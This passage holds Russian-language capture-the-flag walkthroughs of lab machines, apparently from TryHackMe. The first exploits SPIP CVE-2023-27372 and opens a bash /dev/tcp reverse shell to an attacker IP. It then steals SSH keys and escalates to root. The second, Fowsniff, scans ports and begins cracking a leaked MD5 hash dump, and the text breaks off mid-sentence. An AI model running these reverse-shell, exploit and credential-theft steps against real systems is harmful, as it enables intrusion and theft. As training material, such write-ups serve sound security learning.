–¢–µ–ø–µ—Ä—å –º—ã –æ–ø—Ä–µ–¥–µ–ª–∏–ª–∏, —á—Ç–æ CMS –Ω–∞–∑—ã–≤–∞–µ—Ç—Å—è SPIP, –Ω–æ –∫–∞–∫—É—é –≤–µ—Ä—Å–∏—é –º—ã –∏—Å–ø–æ–ª—å–∑—É–µ–º. –Ø –Ω–∞—à–µ–ª —Å–∫–∞–Ω–µ—Ä SPIP CMS –Ω–∞ GitHub, –¥—É–º–∞–ª, —á—Ç–æ –ø–æ—Å–ª–µ–¥–Ω–µ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –±—ã–ª–æ –≤ 2015‚Äì2016 –≥–æ–¥–∞—Ö. –ù–∏–∂–µ –ø—Ä–∏–≤–µ–¥–µ–Ω–∞ —Å—Å—ã–ª–∫–∞ –Ω–∞ —Å–∫–∞–Ω–µ—Ä.

![[Pasted image 20240705003407.png]]

–Ø –∑–Ω–∞–ª, —á—Ç–æ –æ–Ω –¥–æ–ª–∂–µ–Ω –∏–º–µ—Ç—å —Å–ø–æ—Å–æ–± –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –≤–µ—Ä—Å–∏–∏ CMS. –Ø —Ä–µ—à–∏–ª –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å –Ω–∞ –∫–æ–¥ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞, —á—Ç–æ–±—ã —É–≤–∏–¥–µ—Ç—å, –∫–∞–∫ –æ–Ω –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç –≤–µ—Ä—Å–∏—é CMS, –∏ –∫–æ–¥ –Ω–∏–∂–µ —Ç–æ—Ä—á–∏—Ç –∫–∞–∫ –±–æ–ª—å–Ω–æ–π —É–¥–∞—Ä detect_version()

![[Pasted image 20240705003425.png]]

```python
def detect_version(req):
    if 'composed-by' in req.headers:
        res = detect_version_with_header(req.headers['composed-by'])
        if not res:
            res = detect_version_in_html(req.content)
        if res:
            return
    if opts.force:
        print("Doesn't seem to be a SPIP install!")
    else:
        raise Exception('Are you sure it is a SPIP install?')
```

–ò–∑ –∑–∞–≥–æ–ª–æ–≤–∫–æ–≤ –æ—Ç–≤–µ—Ç–∞ –º—ã –º–æ–∂–µ–º —É–∑–Ω–∞—Ç—å –≤–µ—Ä—Å–∏—é SPIP, —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—É—é –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ. –ü—Ä–æ—Å–º–∞—Ç—Ä–∏–≤–∞—è –∑–∞–ø—Ä–æ—Å—ã, –ø—Ä–æ—Ö–æ–¥—è—â–∏–µ —á–µ—Ä–µ–∑ burpsuite, –º—ã –ø–æ–ª—É—á–∞–µ–º, —á—Ç–æ –≤–µ—Ä—Å–∏—è, –∑–∞–ø—É—â–µ–Ω–Ω–∞—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ, ‚Äî 4.2.0

![[Pasted image 20240705003604.png]]

## –ü–æ–ª—É—á–µ–Ω–∏–µ –¥–æ—Å—Ç—É–ø–∞ –∫ —Å–∏—Å—Ç–µ–º–µ 

–°–ª–µ–¥—É—é—â–∏–π —à–∞–≥ ‚Äî –ø–æ–∏—Å–∫ —ç–∫—Å–ø–ª–æ–π—Ç–∞ –¥–ª—è —ç—Ç–æ–π –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–π –≤–µ—Ä—Å–∏–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è, –∏ –º—ã –Ω–∞—à–ª–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—É GitHub —Å —ç–∫—Å–ø–ª–æ–π—Ç–æ–º.

![[Pasted image 20240705003643.png]]

–Ø —Å–∫–æ–ø–∏—Ä–æ–≤–∞–ª –ø—Ä–æ–µ–∫—Ç –Ω–∞ —Å–≤–æ—é –ª–æ–∫–∞–ª—å–Ω—É—é –º–∞—à–∏–Ω—É —Å –ø–æ–º–æ—â—å—é –∫–æ–º–∞–Ω–¥—ã –Ω–∏–∂–µ

```bash
git clone https://github.com/Chocapikk/CVE-2023-27372.git  
Cloning into 'CVE-2023-27372'...  
remote: Enumerating objects: 25, done.  
remote: Counting objects: 100% (14/14), done.  
remote: Compressing objects: 100% (12/12), done.  
remote: Total 25 (delta 4), reused 7 (delta 2), pack-reused 11  
Receiving objects: 100% (25/25), 14.20 KiB | 156.00 KiB/s, done.  
Resolving deltas: 100% (6/6), done.
```

–î–∞–ª–µ–µ —è —É—Å—Ç–∞–Ω–æ–≤–∏–ª –≤—Å–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ —Å –ø–æ–º–æ—â—å—é —Å–ª–µ–¥—É—é—â–µ–π –∫–æ–º–∞–Ω–¥—ã

```bash
pip install -r requirements.txt
```

–î–ª—è –∑–∞–ø—É—Å–∫–∞ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞ —è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª —Å–ª–µ–¥—É—é—â—É—é –∫–æ–º–∞–Ω–¥—É

```python
python CVE-2023-27372.py -u http://10.10.163.99/spip/ -v -o report.txt
```

–ù–∞ —Å–∫—Ä–∏–Ω—à–æ—Ç–µ –Ω–∏–∂–µ –º—ã –≤–∏–¥–∏–º —É–¥–∞–ª–µ–Ω–Ω–æ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–¥–∞ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ.

![[Pasted image 20240705004305.png]]

–î–∞–ª–µ–µ —Å–ª–µ–¥—É–µ—Ç –ø–æ–ª—É—á–∏—Ç—å –æ–±—Ä–∞—Ç–Ω—É—é –æ–±–æ–ª–æ—á–∫—É –Ω–∞ –∫–æ—Ä–æ–±–∫–µ, –∏ –∫–æ–º–∞–Ω–¥–∞, –∫–æ—Ç–æ—Ä—É—é —è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª, –±—ã–ª–∞

```bash
bash -c "bash -i >& /dev/tcp/10.8.84.177/9001 0>&1"
```

–ü–æ—Å–ª–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –ø—Ä–æ—Å–ª—É—à–∏–≤–∞—Ç–µ–ª—è netcat –Ω–∞ –ø–æ—Ä—Ç—É 9001 –º—ã –ø–æ–ª—É—á–∞–µ–º –æ–±—Ä–∞—Ç–Ω—ã–π —à–µ–ª–ª

![[Pasted image 20240705004449.png]]

```bash
nc -nvlp 9001  
listening on [any] 9001 ...  
connect to [10.8.84.177] from (UNKNOWN) [10.10.163.99] 58864  
bash: cannot set terminal process group (1): Inappropriate ioctl for device  
bash: no job control in this shell  
www-data@41c976e507f8:/home/think/spip/spip$
```

## –≠—Å–∫–∞–ª–∞—Ü–∏—è –ø—Ä–∏–≤–µ–ª–∏–≥–∏–π

–£ –Ω–∞—Å –µ—Å—Ç—å –æ–±–æ–ª–æ—á–∫–∞ –∫–∞–∫ —É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è www-data –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ, –∏ –º—ã, –ø–æ—Ö–æ–∂–µ, –ø–æ–ø–∞–ª–∏ –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä docker. –í—ã–ø–æ–ª–Ω–∏–≤ –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ —Ä—É—á–Ω—ã–µ –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è, –º—ã –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞–µ–º –∑–∞–∫—Ä—ã—Ç—ã–π –∫–ª—é—á SSH –≤ –¥–æ–º–∞—à–Ω–µ–º –∫–∞—Ç–∞–ª–æ–≥–µ think, –∏ —É –Ω–∞—Å –µ—Å—Ç—å –¥–æ—Å—Ç—É–ø –Ω–∞ —á—Ç–µ–Ω–∏–µ –∫ –∑–∞–∫—Ä—ã—Ç–æ–º—É –∫–ª—é—á—É

![[Pasted image 20240705004639.png]]

–Ø —Å–∫–æ–ø–∏—Ä–æ–≤–∞–ª –∫–ª—é—á –≤ —Å–≤–æ–π —è—â–∏–∫.

![[Pasted image 20240705004648.png]]

–ü–æ–ø—ã—Ç–∫–∞ SSH –∫ –∫–æ—Ä–æ–±–∫–µ —Å –∫–ª—é—á–æ–º —Å—Ä–∞–±–æ—Ç–∞–ª–∞, –º—ã –≤—ã—à–ª–∏ –∏–∑ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ Docker. –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞ –±—ã–ª–∞ (—É–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –≤—ã –¥–∞–µ—Ç–µ –∑–∞–∫—Ä—ã—Ç–æ–º—É –∫–ª—é—á—É –ø—Ä–∞–≤–∏–ª—å–Ω—ã–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è)

```bash
ssh -i think.ssh think@10.10.163.99
```

![[Pasted image 20240705004728.png]]

–ó–∞–ø—É—Å—Ç–∏–≤ lipeas, –º—ã –ø–æ–ª—É—á–∞–µ–º –¥–≤–æ–∏—á–Ω—ã–π —Ñ–∞–π–ª SUID, –∫–æ—Ç–æ—Ä—ã–π, –ø–æ—Ö–æ–∂–µ, –Ω–∞–∑—ã–≤–∞–µ—Ç—Å—è —Å–∫—Ä–∏–ø—Ç–æ–º bash, –∫ –∫–æ—Ç–æ—Ä–æ–º—É —É –Ω–∞—Å –µ—Å—Ç—å –¥–æ—Å—Ç—É–ø –Ω–∞ –∑–∞–ø–∏—Å—å.

![[Pasted image 20240705010749.png]]

–£—á–∏—Ç—ã–≤–∞—è, —á—Ç–æ –º—ã –º–æ–∂–µ–º –∏–∑–º–µ–Ω–∏—Ç—å¬†**/opt/run_container.sh.**¬†–ü—ã—Ç–∞—é—Å—å –ø—Ä–æ–≤–µ—Ä–∏—Ç—å, —Å–º–æ–≥—É –ª–∏ —è –ø—Ä–æ—á–∏—Ç–∞—Ç—å –∫–æ—Ä–Ω–µ–≤–æ–π –∫–∞—Ç–∞–ª–æ–≥, –∏–∑–º–µ–Ω–∏–≤ –∫–æ–¥ –≤ /opt/run_container.sh

![[Pasted image 20240705010805.png]]

–Ø —Å–¥–µ–ª–∞–ª –∏–∑–º–µ–Ω–µ–Ω–∏—è, –∑–∞—Ç–µ–º —Å–æ—Ö—Ä–∞–Ω–∏–ª —Å–∫—Ä–∏–ø—Ç. –ó–∞–ø—É—Å—Ç–∏–≤ –±–∏–Ω–∞—Ä–Ω—ã–π —Ñ–∞–π–ª, –º—ã –≤–∏–¥–∏–º, —á—Ç–æ –º–æ–∂–µ–º –≤—ã–≤–µ—Å—Ç–∏ —Å–ø–∏—Å–æ–∫ –∫–æ—Ä–Ω–µ–≤–æ–≥–æ –∫–∞—Ç–∞–ª–æ–≥–∞

![[Pasted image 20240705010819.png]]

–í–Ω–∏–º–∞—Ç–µ–ª—å–Ω–æ –ø–æ—Å–º–æ—Ç—Ä–µ–≤ –Ω–∞ –∫–∞—Ç–∞–ª–æ–≥–∏, –º—ã –≤–∏–¥–∏–º, —á—Ç–æ –µ—Å—Ç—å –∫–∞—Ç–∞–ª–æ–≥ .ssh. –Ø –ø–æ–ø—ã—Ç–∞–ª—Å—è —É–≤–∏–¥–µ—Ç—å, –µ—Å—Ç—å –ª–∏ –∑–∞–∫—Ä—ã—Ç—ã–π –∫–ª—é—á, —Å–¥–µ–ª–∞–≤ –µ—â–µ –æ–¥–∏–Ω –ª–∏—Å—Ç–∏–Ω–≥ –∫–∞—Ç–∞–ª–æ–≥–æ–≤

![[Pasted image 20240705010832.png]]

–ú—ã –≤–∏–¥–∏–º, —á—Ç–æ –µ—Å—Ç—å –∑–∞–∫—Ä—ã—Ç—ã–π –∫–ª—é—á, —Å–∫–æ—Ä–µ–µ –≤—Å–µ–≥–æ –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∞—â–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é root.

![[Pasted image 20240705010851.png]]

–Ø —Å–±—Ä–æ—Å–∏–ª –∫–ª—é—á, —Å–Ω–æ–≤–∞ –∏–∑–º–µ–Ω–∏–≤ —Å–∫—Ä–∏–ø—Ç, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂–µ.

![[Pasted image 20240705010940.png]]

![[Pasted image 20240705010945.png]]

–ü–æ–ª—É—á–∞–µ–º –∑–∞–∫—Ä—ã—Ç—ã–π –∫–ª—é—á –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è root. –ú—ã –¥–∞–ª–∏ –∫–ª—é—á—É —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è

![[Pasted image 20240705011022.png]]

–ü–æ–ø—Ä–æ–±–æ–≤–∞–ª –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è –∫ –º–∞—à–∏–Ω–µ –ø–æ SSH –∫–∞–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å root —Å –ø–æ–º–æ—â—å—é –∫–æ–º–∞–Ω–¥—ã

```bash
ssh -i root.ssh root@10.10.163.99
```

![[Pasted image 20240705011105.png]]

–≠—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç, –Ω–∞–º —É–¥–∞–ª–æ—Å—å –≤–æ–π—Ç–∏ –≤ —Å–∏—Å—Ç–µ–º—É –∫–∞–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å root –∏ –ø–æ–ª—É—á–∏—Ç—å —Ñ–ª–∞–≥–∏.

![[Pasted image 20240705011126.png]]

---
# Fowsniff CTF

**–ü–ª–æ—à–∞–¥–∫–∞:** https://tryhackme.com
**–£—Ä–æ–≤–µ–Ω—å:** Easy

## –†–∞–∑–≤–µ–¥–∫–∞

**–ó–∞–¥–∞—á–∞ 1:** –ò—Å–ø–æ–ª—å–∑—É—è nmap, –ø—Ä–æ—Å–∫–∞–Ω–∏—Ä—É–π—Ç–µ —ç—Ç—É –º–∞—à–∏–Ω—É. –ö–∞–∫–∏–µ –ø–æ—Ä—Ç—ã –æ—Ç–∫—Ä—ã—Ç—ã?

```bash
nmap -sV 10.10.163.191  
Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-20 15:44 MSK  
Nmap scan report for 10.10.163.191  
Host is up (0.061s latency).  
Not shown: 996 closed tcp ports (conn-refused)  
PORT ¬†¬†¬†STATE SERVICE VERSION  
22/tcp ¬†open ¬†ssh ¬†¬†¬†¬†OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)  
80/tcp ¬†open ¬†http ¬†¬†¬†Apache httpd 2.4.18 ((Ubuntu))  
110/tcp open ¬†pop3 ¬†¬†¬†Dovecot pop3d  
143/tcp open ¬†imap ¬†¬†¬†Dovecot imapd  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 23.98 seconds
```

–ò—Å—Ö–æ–¥—è –∏–∑ —ç—Ç–æ–≥–æ –º–æ–∂–Ω–æ –ø–æ–Ω—è—Ç—å —á—Ç–æ —É –Ω–∞—Å –æ—Ç–∫—Ä—ã—Ç—ã **ssh**,**http**, **pop3** –∏ **imap** . –î–∞–≤–∞–π—Ç–µ –∫–∞ –ø–µ—Ä–µ–π–¥—ë–º –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –∏ –ø–æ—Å–º–æ—Ç—Ä–∏–º —á—Ç–æ –º—ã —Ç–∞–º –º–æ–∂–µ–º –Ω–∞–π—Ç–∏.

**–ó–∞–¥–∞—á–∞ 2:** –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –∏–∑ –æ—Ç–∫—Ä—ã—Ç—ã—Ö –ø–æ—Ä—Ç–æ–≤. –û—Å–º–æ—Ç—Ä–µ—Ç—å—Å—è. –ß—Ç–æ –≤—ã –º–æ–∂–µ—Ç–µ –Ω–∞–π—Ç–∏?

![[Pasted image 20240320154944.png]]

–ü–µ—Ä–µ–≤–æ–¥: 

```
–í–æ –≤–Ω—É—Ç—Ä–µ–Ω–Ω–µ–π —Å–∏—Å—Ç–µ–º–µ Fowsniff –ø—Ä–æ–∏–∑–æ—à–ª–∞ —É—Ç–µ—á–∫–∞ –¥–∞–Ω–Ω—ã—Ö, –≤ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–µ –∫–æ—Ç–æ—Ä–æ–π –±—ã–ª–∏ —Ä–∞—Å–∫—Ä—ã—Ç—ã –∏–º–µ–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –∏ –ø–∞—Ä–æ–ª–∏ —Å–æ—Ç—Ä—É–¥–Ω–∏–∫–æ–≤.

–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –∫–ª–∏–µ–Ω—Ç–µ –Ω–µ –ø–æ—Å—Ç—Ä–∞–¥–∞–ª–∞.

–í —Å–≤—è–∑–∏ —Å –≤—ã—Å–æ–∫–æ–π –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç—å—é —Ç–æ–≥–æ, —á—Ç–æ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–æ—Ç—Ä—É–¥–Ω–∏–∫–∞—Ö —Å—Ç–∞–ª–∞ –æ–±—â–µ–¥–æ—Å—Ç—É–ø–Ω–æ–π, –≤—Å–µ–º —Å–æ—Ç—Ä—É–¥–Ω–∏–∫–∞–º –±—ã–ª–æ –¥–∞–Ω–æ —É–∫–∞–∑–∞–Ω–∏–µ –Ω–µ–º–µ–¥–ª–µ–Ω–Ω–æ —Å–º–µ–Ω–∏—Ç—å —Å–≤–æ–∏ –ø–∞—Ä–æ–ª–∏.

–ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞–º —Ç–∞–∫–∂–µ —É–¥–∞–ª–æ—Å—å –≤–∑–ª–æ–º–∞—Ç—å –Ω–∞—à –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç @fowsniffcorp –≤ –¢–≤–∏—Ç—Ç–µ—Ä–µ. –í—Å–µ –Ω–∞—à–∏ –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–µ —Ç–≤–∏—Ç—ã –±—ã–ª–∏ —É–¥–∞–ª–µ–Ω—ã, –∏ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∏ –º–æ–≥—É—Ç –æ–ø—É–±–ª–∏–∫–æ–≤–∞—Ç—å –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é —á–µ—Ä–µ–∑ —ç—Ç–æ—Ç –Ω–æ—Å–∏—Ç–µ–ª—å. –ú—ã —Ä–∞–±–æ—Ç–∞–µ–º –Ω–∞–¥ —Ç–µ–º, —á—Ç–æ–±—ã —Ä–µ—à–∏—Ç—å —ç—Ç—É –ø—Ä–æ–±–ª–µ–º—É –∫–∞–∫ –º–æ–∂–Ω–æ —Å–∫–æ—Ä–µ–µ.

–ú—ã –≤–µ—Ä–Ω–µ–º—Å—è –∫ –ø–æ–ª–Ω–æ–π –º–æ—â–Ω–æ—Å—Ç–∏ –ø–æ—Å–ª–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å–µ—Ä–≤–∏—Å–∞.
```

–ú—ã –≤–∏–¥–∏–º, —á—Ç–æ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ –≥–æ–≤–æ—Ä–∏—Ç—Å—è, —á—Ç–æ –≤–æ –≤–Ω—É—Ç—Ä–µ–Ω–Ω–µ–π —Å–∏—Å—Ç–µ–º–µ Fowsniff –ø—Ä–æ–∏–∑–æ—à–ª–∞ —É—Ç–µ—á–∫–∞ –¥–∞–Ω–Ω—ã—Ö, –∏ –∏–º–µ–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –∏ –ø–∞—Ä–æ–ª–∏ —Å–æ—Ç—Ä—É–¥–Ω–∏–∫–æ–≤ –º–æ–≥–ª–∏ –±—ã—Ç—å —Ä–∞—Å–∫—Ä—ã—Ç—ã. –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞–º —Ç–∞–∫–∂–µ —É–¥–∞–ª–æ—Å—å –∑–∞—Ö–≤–∞—Ç–∏—Ç—å –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—É—é —É—á–µ—Ç–Ω—É—é –∑–∞–ø–∏—Å—å @fowsniffcorp –≤ –¢–≤–∏—Ç—Ç–µ—Ä–µ, –∏ —á–µ—Ä–µ–∑ —ç—Ç—É —É—á–µ—Ç–Ω—É—é –∑–∞–ø–∏—Å—å –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∏ –º–æ–≥—É—Ç —Ä–∞—Å–∫—Ä—ã—Ç—å –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é! –ü–æ—Å–º–æ—Ç—Ä–∏–º, —Å–¥–µ–ª–∞–ª–∏ –ª–∏ –æ–Ω–∏ —ç—Ç–æ —É–∂–µ :).

**–ó–∞–¥–∞—á–∞ 3:** –° –ø–æ–º–æ—â—å—é Google –º–æ–∂–µ—Ç–µ –ª–∏ –≤—ã –Ω–∞–π—Ç–∏ –æ –Ω–∏—Ö –∫–∞–∫—É—é-–ª–∏–±–æ –æ–±—â–µ–¥–æ—Å—Ç—É–ø–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é?

–ü—Ä–æ–≤–µ—Ä–∏–≤ –∞–∫–∫–∞—É–Ω—Ç @fowsniffcorp –≤ –¢–≤–∏—Ç—Ç–µ—Ä–µ, –º—ã –≤–∏–¥–∏–º:

![[Pasted image 20240320155451.png]]

–ö–∞–∂–µ—Ç—Å—è, –µ–≥–æ –ø–æ–¥—Å—Ç–∞–≤–∏–ª–∏, –∫–∞–∫ –∏ –ø—Ä–µ–¥–ø–æ–ª–∞–≥–∞–ª–æ—Å—å. –°—É–¥—è –ø–æ –≤—Å–µ–º—É, –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ —Ä–∞—Å–∫—Ä—ã–ª –ø–∞—Ä–æ–ª–∏, —á—Ç–æ –≤–∏–¥–Ω–æ –∏–∑ –ø—Ä–∏–∫—Ä–µ–ø–ª–µ–Ω–Ω–æ–≥–æ —Ç–≤–∏—Ç–∞. –î–∞–≤–∞–π—Ç–µ –æ—Ç–∫—Ä–æ–µ–º —Å—Å—ã–ª–∫—É –Ω–∞ Pastebin, —á—Ç–æ–±—ã —É–≤–∏–¥–µ—Ç—å –¥–∞–º–ø.

–ü–µ—Ä–µ–π–¥—è –Ω–∞¬†[https://pastebin.com/NrAqVeeX](https://pastebin.com/NrAqVeeX)¬†, –º—ã –ø–æ–ª—É—á–∏–º —Å–ª–µ–¥—É—é—â–∏–µ —Ö—ç—à–∏ –ø–∞—Ä–æ–ª–µ–π –≤–º–µ—Å—Ç–µ —Å –∞–¥—Ä–µ—Å–∞–º–∏ —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ–π –ø–æ—á—Ç—ã:

```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4   
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56   
tegel@fowsniff:1dc352435fecca338acfd4be10984009   
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb   
seina@fowsniff:90dc16d47114aa13671c697fd506cf26   
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd   
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b   
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11   
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e   

Fowsniff Corporation Passwords LEAKED!   
POWSNIFF CORP PASSWORD DUMP!


Here are their email passwords, downloaded from their databases.
They also left their pop3 server WIDE OPEN!
MD5 is not secure so you shouldn't have any problems cracking it, but I was too lazy haha ‚Äã‚Äã=P
```

![[Pasted image 20240320161112.png]]

–ù–∞–∫–æ–Ω–µ—Ü-—Ç–æ –º—ã –Ω–∞—à–ª–∏ –∏–Ω—Ç–µ—Ä–µ—Å–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é. –ù–∞ —Å–∫—Ä–∏–Ω—à–æ—Ç–µ –≤—ã—à–µ –º—ã –≤–∏–¥–∏–º –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä—ã —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ–π –ø–æ—á—Ç—ã –∏ —Ö—ç—à–∏ –ø–∞—Ä–æ–ª–µ–π –∏–∑ —Å–ª—É–∂–±—ã POP3. –ò –∏–∑ —à–∞–≥–∞ 2 –º—ã —É–∂–µ –∑–Ω–∞–µ–º, —á—Ç–æ –ø–æ—Ä—Ç POP3 –±—ã–ª –æ—Ç–∫—Ä—ã—Ç. –ó–Ω–∞—á–∏—Ç, —ç—Ç–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –Ω–∞–º –ø–æ–ª–µ–∑–Ω–∞.

–ù–æ —ç—Ç–æ —Ö–µ—à–∏ –ø–∞—Ä–æ–ª–µ–π. –ù–∞–º –Ω—É–∂–Ω–æ —É–∑–Ω–∞—Ç—å –ø–∞—Ä–æ–ª–∏. –ù–∞ —Å–ª–µ–¥—É—é—â–µ–º —ç—Ç–∞–ø–µ –¥–∞–≤–∞–π—Ç–µ –ø–æ–ø—Ä–æ–±—É–µ–º –≤–∑–ª–æ–º–∞—Ç—å —ç—Ç–∏ –ø–∞—Ä–æ–ª–∏ —Å –ø–æ–º–æ—â—å—é –æ–Ω–ª–∞–π–Ω-–∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤ –¥–ª—è –≤–∑–ª–æ–º–∞ –ø–∞—Ä–æ–ª–µ–π.

## –í–∑–ª–æ–º —Ö—ç—à–∞

**–ó–∞–¥–∞—á–∞ 4:** –ú–æ–∂–µ—Ç–µ –ª–∏ –≤—ã —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞—Ç—å —ç—Ç–∏ —Ö–µ—à–∏ md5? –í—ã –¥–∞–∂–µ –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ç–∞–∫–∏–µ —Å–∞–π—Ç—ã, –∫–∞–∫ hashkiller, –¥–ª—è –∏—Ö –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏—è.

–ú–æ–∂–Ω–æ —Å –ø–æ–º–æ—â—å—é –æ–Ω–ª–∞–π–Ω —Å–µ—Ä–≤–∏—Å–æ–≤ –∏–ª–∏ –¥—Ä—É–≥–∏—Ö —É—Ç–∏–ª–∏—Ç—å –≤–∑–ª–æ–º–∞—Ç—å —Ö—ç—à—ã. –í –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–µ –º–æ–∂–µ—Ç–µ –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å –∫–∞–∫–∏–µ —Å–µ—Ä–≤–∏—Å—ã —Ö–æ—Ä–æ—à–æ –ª–æ–º–∞—é—Ç 
–∏–ª–∏ –∂–µ –ª—É—á—à–∏–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –¥–ª—è –∫—Ä–∞–∫–∞ —Ö—ç—à–∞ –∏ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è –ø–æ –∏—Ö –ø—Ä–∏–º–∏–Ω–µ–Ω–∏—é.

–ù–∞ –¥–∞–Ω–Ω—ã–π –º–æ–º–µ–Ω—Ç —É –Ω–∞—Å –µ—Å—Ç—å —Ö—ç—à–∏ –ø–∞—Ä–æ–ª–µ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π POP3. –¢–µ–ø–µ—Ä—å –ø–æ–ø—Ä–æ–±—É–µ–º –µ–≥–æ –≤–∑–ª–æ–º–∞—Ç—å. –ú—ã –±—É–¥–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –æ–Ω–ª–∞–π–Ω-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –¥–ª—è –≤–∑–ª–æ–º–∞ –ø–∞—Ä–æ–ª–µ–π CrackStation, –∫–æ—Ç–æ—Ä–æ–µ –ø—Ä–∏–Ω–∏–º–∞–µ—Ç —Ö—ç—à-–ø–∞—Ä–æ–ª–∏ –≤ –∫–∞—á–µ—Å—Ç–≤–µ –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –∏ –ø—ã—Ç–∞–µ—Ç—Å—è –∏—Ö –≤–∑–ª–æ–º–∞—Ç—å. –í—Å–µ –ø—Ä–æ—Å—Ç–æ: –Ω–∞–º –Ω—É–∂–Ω–æ —Å–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –∏ 